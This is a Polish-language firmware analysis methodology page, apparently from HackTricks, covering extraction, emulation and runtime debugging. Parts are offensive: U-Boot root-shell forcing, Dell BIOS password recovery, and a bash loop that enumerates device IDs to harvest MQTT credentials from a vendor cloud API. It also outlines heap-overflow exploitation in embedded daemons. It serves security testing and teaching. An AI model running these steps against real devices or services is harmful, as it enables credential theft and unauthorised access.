# Analiza firmware’u

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Wprowadzenie**

### Powiązane zasoby

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń, zarządzając komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy wchodzą w interakcję. Jest przechowywany w pamięci trwałej, dzięki czemu urządzenie ma dostęp do kluczowych instrukcji od chwili włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza i potencjalna modyfikacja firmware’u to kluczowy etap identyfikowania luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>

## **Zbieranie informacji**

**Zbieranie informacji** to kluczowy pierwszy krok w poznaniu budowy urządzenia i wykorzystywanych przez nie technologii. Proces ten obejmuje gromadzenie danych na temat:

- Architektury CPU i uruchomionego na nim systemu operacyjnego
- Szczegółów dotyczących bootloadera
- Układu sprzętowego i kart katalogowych
- Metryk bazy kodu i lokalizacji źródeł
- Bibliotek zewnętrznych i typów licencji
- Historii aktualizacji i certyfikatów zgodności z przepisami
- Diagramów architektury i przepływu
- Ocen bezpieczeństwa i zidentyfikowanych luk

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza dostępnych komponentów oprogramowania open source z wykorzystaniem przeglądu ręcznego i automatycznego. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie firmware’u**

Firmware można pozyskać na kilka sposobów, z których każdy wiąże się z innym poziomem złożoności:

- **Bezpośrednio** ze źródła (od deweloperów, producentów)
- **Budując** go na podstawie udostępnionych instrukcji
- **Pobierając** z oficjalnych stron pomocy technicznej
- Używając zapytań **Google dork** do wyszukiwania udostępnionych plików firmware’u
- Uzyskując bezpośredni dostęp do **cloud storage** za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
- **Wyodrębniając** firmware z urządzenia przez połączenia takie jak **UART**, **JTAG** lub **PICit**
- **Nasłuchując** żądań aktualizacji w komunikacji urządzenia
- Identyfikując i wykorzystując **zahardkodowane punkty końcowe aktualizacji**
- **Zrzucając** firmware z bootloadera lub przez sieć
- **Wyjmując i odczytując** układ pamięci, gdy inne metody zawiodą, przy użyciu odpowiednich narzędzi sprzętowych

### Logi dostępne wyłącznie przez UART: wymuś powłokę roota za pomocą środowiska U-Boot w pamięci flash

Jeśli RX UART jest ignorowane (dostępne są tylko logi), nadal można wymusić uruchomienie powłoki init, **edytując offline blob środowiska U-Boot**:<sup>[[6]](#references)</sup>

1. Zrzuć zawartość pamięci SPI flash za pomocą klipsa SOIC-8 i programatora (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Zlokalizuj partycję env U-Boot, edytuj `bootargs`, aby dodać `init=/bin/sh`, i **ponownie oblicz CRC32 env U-Boot** dla blobu.
3. Wgraj ponownie tylko partycję env i uruchom ponownie urządzenie; w UART powinien pojawić się shell.

Jest to przydatne w przypadku urządzeń wbudowanych, w których shell bootloadera jest wyłączony, ale partycję env można zapisywać za pomocą zewnętrznego dostępu do pamięci flash.

## Analiza firmware

Skoro **masz już firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak z nim postępować. Możesz do tego użyć różnych narzędzi:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Jeśli za pomocą tych narzędzi nie znajdziesz zbyt wiele, sprawdź **entropię** obrazu poleceniem `binwalk -E <bin>`; jeśli jest niska, obraz raczej nie jest zaszyfrowany. Jeśli jest wysoka, obraz prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).

Możesz też użyć tych narzędzi, aby wyodrębnić **pliki osadzone w firmware**:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), aby sprawdzić plik.

### Różnicowa analiza flash i odzyskiwalne magazyny sekretów XOR

Gdy format przechowywania ustawienia firmware nie jest udokumentowany, najpierw wykonaj kilka odczytów tej samej pamięci flash, zmień **dokładnie jedno** ustawienie, ponownie zrzutuj zawartość całego układu i porównaj przesunięcia. Powtarzanie eksperymentu z kontrolowanymi wartościami pozwala odróżnić dane ustawienia od liczników i metadanych zapisu; zmiany pod nowymi przesunięciami zamiast w miejscu wskazują na magazyn typu append-only lub o strukturze dziennika. Zachowaj usunięte wpisy i wpisy oznaczone jako usunięte — ich bajty danych mogą nadal nadawać się do odzyskania.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Po zlokalizowaniu regionu wyodrębnij moduły firmware za pomocą narzędzi takich jak `binwalk` i przeanalizuj wstecznie writer/validator w Ghidra. Potwierdź w kodzie granice pól, padding, indeksowanie klucza i wyprowadzanie klucza, zamiast wnioskować o schemacie wyłącznie na podstawie wzorców szyfrogramu.<sup>[[10]](#references)</sup>

#### Odzyskiwanie kluczy z zaszyfrowanego paddingu zerami

Jak opisano w [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), znany tekst ujawnia bajty strumienia klucza na tych samych offsetach. Pole o stałym rozmiarze jest szczególnie narażone, gdy jego padding zerami obejmuje każdy indeks powtarzanego klucza XOR: zaszyfrowany padding ujawnia bezpośrednio te bajty klucza, ponieważ `0x00 XOR key_byte = key_byte`. Jeśli uwzględniony jest każdy indeks klucza, odtwórz klucz z końcówki szyfrogramu i odszyfruj wypełnione bajty.<sup>[[10]](#references)</sup>

Podatny format hasła BIOS-u DVAR firmy Dell jest konkretnym przykładem: bajt `0` pola o długości 32 bajtów jest jawnym tekstem, a bajty `1..31` używają powtarzanego klucza o długości 20 bajtów.<sup>[[10]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Dla hasła o długości `L` pozycje `L..31` miały wartość zero przed operacją XOR. Gdy `L <= 12`, pozycje te obejmują wszystkie indeksy klucza, więc cały klucz i hasło można odzyskać bez brute force:<sup>[[10]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Pozyskiwanie kluczy z historycznych rekordów

Nie analizuj każdego rekordu osobno. Klucz DVAR jest wyprowadzany w przybliżeniu jako `modified_md5(device_seed || variable_GUID || password[0])`: seed urządzenia i GUID są stałe, a jedynym wejściem zależnym od hasła jest jego pierwszy bajt w postaci jawnej. Daje to najwyżej 256 kluczy na urządzenie, więc rekordy zaczynające się od tego samego bajtu mają ten sam klucz. Grupuj aktywne i usunięte rekordy według tego bajtu; krótki historyczny rekord może przez padding leakować cały klucz, który pozwoli odszyfrować aktualny, dłuższy rekord, którego własny padding nie wystarcza. Rotacja hasła może więc zwiększyć ekspozycję, jeśli stary szyfrogram zostanie oznaczony jako usunięty, zamiast wymazany.<sup>[[10]](#references)</sup>

Narzędzie [`dellpwn`](https://github.com/R3n5k1/dellpwn) lokalizuje DVAR, weryfikuje potencjalne rekordy, odzyskuje hasła i może wyświetlać surowe bajty przechowywanych danych/klucza. Skompiluj je z checkoutu i przeskanuj zweryfikowany obraz flash w następujący sposób:<sup>[[11]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

W przypadku własnych parserów odrzucaj fałszywe trafienia na podstawie struktury rekordów, wymagań dotyczących drukowalnych znaków, kontroli dopełniania zerami, entropii klucza i spójności w miejscu, w którym klucz się zawija. Jeśli powtarzane zrzuty pokazują rzadkie zmiany bitów przy każdym zapisie, wylicz zaobserwowane maski i uszereguj możliwe korekty na podstawie tych warunków, ale niejednoznaczne znaki oznacz jako takie, zamiast przedstawiać wynik heurystyczny jako dokładne odzyskanie.<sup>[[10]](#references)</sup>

Weryfikatory haseł powinny przechowywać solony, iterowany hash jednokierunkowy zamiast odwracalnego szyfrogramu, a magazyny o strukturze dziennika powinny bezpiecznie usuwać nieaktualne dane poufne.<sup>[[10]](#references)</sup>

### Uzyskiwanie systemu plików

Korzystając z wcześniej omówionych narzędzi, takich jak `binwalk -ev <bin>`, powinno udać Ci się **wyodrębnić system plików**.\
Binwalk zazwyczaj wyodrębnia go do **folderu o nazwie odpowiadającej typowi systemu plików**, którym zwykle jest jeden z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie ma bajtu magicznego systemu plików wśród swoich sygnatur**. W takim przypadku użyj binwalk, aby **znaleźć offset systemu plików i wyciąć skompresowany system plików** z pliku binarnego, a następnie **ręcznie go wyodrębnić** zgodnie z jego typem, wykonując poniższe kroki.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Uruchom poniższe **polecenie dd**, aby wyodrębnić system plików Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatywnie można również uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki znajdą się później w katalogu "`squashfs-root`".

- Pliki archiwów CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs z pamięcią flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmware

Po uzyskaniu firmware należy go przeanalizować, aby zrozumieć jego strukturę i potencjalne podatności. Proces ten obejmuje użycie różnych narzędzi do analizy i wyodrębniania cennych danych z obrazu firmware.

### Narzędzia do wstępnej analizy

Poniżej przedstawiono zestaw poleceń do wstępnej inspekcji pliku binarnego (określanego jako `<bin>`). Pomagają one identyfikować typy plików, wyodrębniać ciągi znaków, analizować dane binarne oraz poznawać szczegóły partycji i systemu plików:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Aby ocenić stan szyfrowania obrazu, sprawdza się jego **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka może wskazywać na szyfrowanie lub kompresję.

Do wyodrębniania **osadzonych plików** zaleca się narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Polecenie `binwalk -ev <bin>` zazwyczaj pozwala wyodrębnić system plików, często do katalogu nazwanego zgodnie z jego typem (np. squashfs, ubifs). Jeśli jednak **binwalk** nie rozpoznaje typu systemu plików z powodu braku bajtów magicznych, konieczne jest ręczne wyodrębnienie. Polega ono na użyciu `binwalk` do znalezienia przesunięcia systemu plików, a następnie polecenia `dd` do wyodrębnienia jego fragmentu:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Następnie, w zależności od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), do ręcznego wyodrębnienia zawartości używa się różnych poleceń.

### Analiza systemu plików

Po wyodrębnieniu systemu plików rozpoczyna się poszukiwanie luk w zabezpieczeniach. Zwraca się uwagę na niezabezpieczone demony sieciowe, dane uwierzytelniające zapisane na stałe, endpointy API, funkcje serwera aktualizacji, niekompilowany kod, skrypty startowe oraz skompilowane pliki binarne przeznaczone do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia:

- **etc/shadow** i **etc/passwd** — dane uwierzytelniające użytkowników
- Certyfikaty SSL i klucze w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
- Wbudowane pliki binarne do dalszej analizy
- Typowe serwery WWW i pliki binarne urządzeń IoT

Wykrywanie poufnych informacji i luk w systemie plików ułatwiają następujące narzędzia:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych plików binarnych

Należy dokładnie przeanalizować zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w systemie plików, szukając luk. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix i **PESecurity** dla plików binarnych Windows pomagają wykryć pliki binarne bez zabezpieczeń, które można wykorzystać.

## Pozyskiwanie konfiguracji chmurowej i danych uwierzytelniających MQTT za pomocą tokenów URL wyliczanych na podstawie danych

Wiele hubów IoT pobiera konfigurację dla poszczególnych urządzeń z endpointu chmurowego o postaci:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware można znaleźć informacje, że `<token>` jest lokalnie wyliczany na podstawie identyfikatora urządzenia z użyciem sekretu zapisanego na stałe, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i zapisany jako wielkie litery w systemie szesnastkowym

Taka konstrukcja pozwala każdemu, kto pozna deviceId i STATIC_KEY, odtworzyć URL i pobrać konfigurację chmurową, często zawierającą dane uwierzytelniające MQTT w postaci jawnej oraz prefiksy tematów.

Praktyczny przebieg:

1) Wyodrębnij deviceId z logów rozruchowych UART

- Podłącz adapter UART 3.3V (TX/RX/GND) i przechwyć logi:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Poszukaj wierszy wypisujących wzorzec adresu URL konfiguracji chmurowej i adres brokera, na przykład:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Odzyskaj STATIC_KEY i algorytm tokenu z firmware

- Załaduj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wyprowadź token w Bash i zamień skrót na wielkie litery:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Zbierz konfigurację chmury i poświadczenia MQTT

- Złóż URL i pobierz JSON za pomocą curl; użyj jq, aby wyodrębnić sekrety:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Nadużywaj niezaszyfrowanego MQTT i słabych ACL-ów tematów (jeśli występują)

- Użyj odzyskanych danych uwierzytelniających, aby subskrybować tematy konserwacyjne i szukać wrażliwych zdarzeń:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Wyliczaj przewidywalne identyfikatory urządzeń (na dużą skalę, za zgodą)

- Wiele ekosystemów używa bajtów OUI/produktu/typu dostawcy, po których następuje sekwencyjny sufiks.
- Możesz iterować po potencjalnych identyfikatorach, programowo wyprowadzać tokeny i pobierać konfiguracje:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- Zawsze uzyskaj wyraźną zgodę przed próbą masowej enumeracji.
- Jeśli to możliwe, wybieraj emulację lub analizę statyczną, aby odzyskać sekrety bez modyfikowania docelowego sprzętu.


Proces emulacji firmware umożliwia **analizę dynamiczną** działania urządzenia lub pojedynczego programu. Podejście to może napotkać trudności związane z zależnościami od sprzętu lub architektury, ale przeniesienie głównego systemu plików lub konkretnych plików binarnych na urządzenie o zgodnej architekturze i endianowości, takie jak Raspberry Pi, albo do wstępnie skonfigurowanej maszyny wirtualnej może ułatwić dalsze testowanie.

### Emulowanie pojedynczych plików binarnych

Podczas badania pojedynczych programów kluczowe jest ustalenie ich endianowości i architektury procesora.

#### Przykład z architekturą MIPS

Do emulacji pliku binarnego dla architektury MIPS można użyć polecenia:

```bash
file ./squashfs-root/bin/busybox
```

Aby zainstalować niezbędne narzędzia do emulacji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Dla MIPS (big-endian) używa się `qemu-mips`, a w przypadku binariów little-endian należy wybrać `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku binariów ARM proces jest podobny — do emulacji używa się emulatora `qemu-arm`.

### Emulacja pełnego systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne ułatwiają emulację całego firmware, automatyzując ten proces i wspomagając analizę dynamiczną.

### Odtwarzanie podzielonych i weryfikowanych systemów plików root do emulacji

Jeśli superblok SquashFS jest czytelny, ale przesunięcia tabeli inode’ów, katalogów lub fragmentów są niemożliwe do ustalenia, nie poprawiaj od razu `unsquashfs`. Zdeasembluj wczesny plik binarny startowy i odtwórz graf urządzeń blokowych, który on tworzy: systemy wbudowane mogą udostępniać nominalną partycję root, ale konstruować właściwy system plików za pomocą mapowania `dm-linear`, które dołącza sektory pożyczone z innej partycji. Kontrole obejmujące tylko superblok mogą się powieść, nawet jeśli wszystkie późniejsze bloki metadanych są przesunięte.<sup>[[9]](#references)</sup>

Zachowaj dokładnie operacje arytmetyczne użyte w firmware. W szczególności ustal, czy długości są wyrażone w bajtach, sektorach 512-bajtowych czy stronach 4 KiB; odtwórz przesunięcia bitowe i obcięcia w ich pierwotnej kolejności; uwzględnij też zależne od banku obszary końcowe w układach A/B. Na przykład `(partition_bytes >> 12) << 3` najpierw obcina wartość do granicy 4 KiB, a dopiero potem wyraża wynik w sektorach 512-bajtowych; zastąpienie tego przez `partition_bytes // 512` może przesunąć dołączany obszar o kilka kilobajtów i uszkodzić wszystkie dalsze tabele SquashFS.<sup>[[9]](#references)</sup>

Przydatny proces weryfikacji:<sup>[[9]](#references)</sup>

1. Odtwórz źródłowe urządzenie, początkowy sektor i długość każdego segmentu `dm-linear` na podstawie pliku binarnego weryfikatora/init.
2. Połącz zakresy lub zmapuj je, nie zmieniając zasad wyrównania.
3. Jeśli ekstrakcja nadal się nie powiedzie, przeszukaj tylko niewielki obszar wokół przewidywanej granicy i wymagaj kilku kolejnych poprawnych struktur metadanych, zamiast akceptować sam wiarygodnie wyglądający superblok.
4. Uruchom niezmodyfikowane `unsquashfs` na odtworzonym obrazie; poprawne przejście przez wszystkie katalogi i fragmenty jest mocniejszym dowodem niż wynik `unsquashfs -stat`.

#### Zastąpienie dm-verity kontrolowane przez analityka

Gdy analityk kontroluje jądro QEMU, initramfs i dyski wirtualne, zmodyfikowany system root można uruchomić, zastępując dostarczany przez producenta proces weryfikacji PID 1 niewielkim, statycznie linkowanym init. Jest to **podstawienie łańcucha rozruchowego w laboratorium**, a nie obejście dm-verity, jego podpisu RSA, Secure Boot ani klucza chronionego przez TPM.<sup>[[9]](#references)</sup>

Zastępczy init powinien odtworzyć operacyjne etapy oryginalnej ścieżki rozruchu: zamontować `devtmpfs`, wywołać `setsid()`, podłączyć `/dev/console` do deskryptorów plików 0–2, zamontować `/proc` i `/sys`, zaczekać na udostępnione urządzenie blokowe, zamontować zmodyfikowany system root w trybie tylko do odczytu, odłączyć pseudo-systemy plików starego systemu root, przenieść nowe montowanie na `/`, wykonać `chroot` i uruchomić za pomocą `execve()` oryginalny plik firmware `/sbin/init`. Odłączenie `/dev`, `/proc` i `/sys` **przed** `MS_MOVE` zapobiega przypadkowemu odłączeniu punktów montowania należących do nowego systemu root.<sup>[[9]](#references)</sup>

Oddziel zmienny stan urządzenia od zmodyfikowanego, niezmiennego systemu root. Nakładka qcow2 może zachować stan LVM oryginalnego dysku, a drugi dysk virtio tylko do odczytu może udostępniać zmodyfikowany SquashFS:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugowanie stanu obrazu offline

Sprawdź trwały stan poza guestem, gdy powolne uruchamianie, destrukcyjne skrypty startowe lub zawodne logowanie z konsoli utrudniają ustalenie przyczyny awarii. Nigdy nie podłączaj overlayu używanego przez działającą maszynę wirtualną; udostępnij go przez `qemu-nbd`, ogranicz wykrywanie LVM do odpowiedniej partycji NBD i dezaktywuj grupę woluminów przed odłączeniem.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

W celu powtarzalnego izolowania usterek zapisuj pliki znacznikowe z sygnaturą czasową na stabilnym, zapisywalnym woluminie i weryfikuj je offline; `/dev/kmsg`, FIFO i ulotne konsole mogą powodować fałszywe wyniki negatywne z powodu ograniczania szybkości lub przedwczesnego zakończenia procesu. Przed zmianą niezwiązanego kodu porównuj też dokładne interfejsy między warstwami: `uname -r` z `/lib/modules/`, funkcje ext4 na dysku z konfiguracją jądra oraz generację `libGL` z Mesa z ABI sterownika DRI i nazwami sterowników wywnioskowanymi z PCI. Komponent może istnieć, a nawet pomyślnie załadować się przez `dlopen()`, a mimo to być bezużyteczny, ponieważ jego odbiorca oczekuje innego ABI.<sup>[[9]](#references)</sup>

## Analiza dynamiczna w praktyce

Na tym etapie do analizy używa się rzeczywistego lub emulowanego środowiska urządzenia. Niezbędne jest zachowanie dostępu do powłoki systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać sprzętu idealnie, co może wymagać okazjonalnego ponownego uruchomienia emulatora. Analiza powinna obejmować ponowne sprawdzenie systemu plików, wykorzystanie udostępnionych stron WWW i usług sieciowych oraz badanie luk w bootloaderze. Testy integralności firmware’u są kluczowe do wykrywania potencjalnych luk typu backdoor.

## Techniki analizy w czasie działania

Analiza w czasie działania polega na interakcji z procesem lub plikiem binarnym w jego środowisku operacyjnym. Wykorzystuje się do tego narzędzia takie jak gdb-multiarch, Frida i Ghidra, aby ustawiać breakpointy i wykrywać luki za pomocą fuzzingu i innych technik.

W przypadku celów wbudowanych bez pełnego debuggera **skopiuj na urządzenie statycznie linkowany `gdbserver`** i połącz się z nim zdalnie:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapowanie komunikatów Zigbee / koprocesora radiowego

W hubach IoT stos RF jest często podzielony między **radio MCU** a proces działający w przestrzeni użytkownika Linuksa. Przydatny proces roboczy polega na prześledzeniu ścieżki:<sup>[[8]](#references)</sup>

1. **Ramka RF** przesyłana drogą radiową
2. **Parser po stronie kontrolera** na radio MCU
3. **Tekstowy protokół szeregowy/UART lub TLV** przekazywany do Linuksa (na przykład `/dev/tty*`)
4. **Dyspozytor aplikacji** w głównym demonie
5. **Procedura obsługi specyficzna dla protokołu / maszyna stanów**

Taka architektura tworzy dwa cele analizy wstecznej zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, ustal:

- **Grupy komunikatów** i tablice dyspozytora
- Które komunikaty mogą pochodzić z **sieci**, a które od samego kontrolera
- Dokładne **pola rozróżniające specyficzne dla producenta** (na przykład Zigbee `manufacturer_code` i niestandardowe `cluster_command`)
- Które procedury obsługi są osiągalne tylko podczas **commissioning**, wykrywania lub pobierania firmware/modelu

W przypadku Zigbee przechwyć ruch podczas parowania i sprawdź, czy cel nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, podsłuch ruchu podczas commissioning może ujawnić **Network Key**. Kody instalacyjne Zigbee 3.0 ograniczają to ryzyko, sprawdź więc, czy testowane urządzenie faktycznie ich wymaga.

### Specyficzne dla producenta procedury obsługi protokołu i osiągalność zależna od FSM

Polecenia Zigbee/ZCL specyficzne dla producenta są często lepszym celem niż standaryzowane klastry, ponieważ trafiają do **niestandardowego kodu parsującego** i wewnętrznych **FSM**, w których walidacja jest mniej sprawdzona w praktyce.<sup>[[8]](#references)</sup>

Praktyczny proces:

- Przeanalizuj wstecz dyspozytor poleceń, aż znajdziesz **procedurę obsługi dostępną tylko dla producenta**.
- Odtwórz tabele **stanów FSM**, **zdarzeń**, **warunków sprawdzających**, **akcji** i **stanów następnych**.
- Zidentyfikuj **stany przejściowe**, które automatycznie przechodzą dalej, oraz gałęzie ponowień/błędów, które ostatecznie resetują lub zwalniają pamięć kontrolowaną przez atakującego.
- Ustal, które prawidłowe wymiany protokołu są wymagane, aby wprowadzić demona w podatny stan. Nie zakładaj, że wadliwa procedura obsługi jest zawsze osiągalna.

W przypadku protokołów wrażliwych na opóźnienia odtwarzanie pakietów za pomocą frameworka Python może być zbyt wolne. Bardziej niezawodnym podejściem jest emulacja prawidłowego urządzenia na rzeczywistym sprzęcie (na przykład **nRF52840**) z użyciem stosu klasy producenckiej, aby udostępnić właściwe **punkty końcowe**, **atrybuty** i synchronizację commissioning.

### Klasa błędów w pobieraniu fragmentowanym w demonach wbudowanych

Powtarzająca się klasa błędów firmware występuje podczas **fragmentowanego pobierania blobów/modeli/konfiguracji**:<sup>[[8]](#references)</sup>

1. **Pierwszy fragment** (`offset == 0`) zapisuje `ctx->total_size` i alokuje `malloc(total_size)`.
2. Kolejne fragmenty weryfikują jedynie kontrolowane przez atakującego pola dotyczące **bieżącego pakietu**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzania, czy mieści się ono w **pierwotnie zaalokowanym rozmiarze**.

Dzięki temu atakujący może wysłać:

- Pierwszy prawidłowy fragment z **małym** zadeklarowanym rozmiarem całkowitym, aby wymusić małą alokację na stercie.
- Późniejszy fragment z **oczekiwanym przesunięciem**, ale większym `chunk_len`.
- Sfałszowany rozmiar dotyczący bieżącego pakietu, który spełnia nowe kontrole, a mimo to powoduje przepełnienie pierwotnie zaalokowanego bufora.

Gdy podatna ścieżka jest dostępna dopiero po logice commissioning, exploitacja musi obejmować wystarczającą **emulację urządzenia**, by wprowadzić cel w oczekiwany stan pobierania modelu lub bloba przed wysłaniem nieprawidłowych fragmentów.

### Wyzwalacze `free()` sterowane protokołem

W demonach wbudowanych najłatwiejszym sposobem na wywołanie exploitacji metadanych sterty jest często nie „czekanie na sprzątanie”, lecz **wymuszenie obsługi błędu przez sam protokół**:<sup>[[8]](#references)</sup>

- Wysyłaj nieprawidłowe kolejne fragmenty, aby wprowadzić FSM w stan **ponawiania** lub **błędu**.
- Przekrocz limit ponowień, aby demon **zresetował kontekst** i zwolnił uszkodzony bufor.
- Wykorzystaj to przewidywalne `free()`, aby uruchomić mechanizmy alokatora, zanim proces ulegnie awarii z niezwiązanych przyczyn.

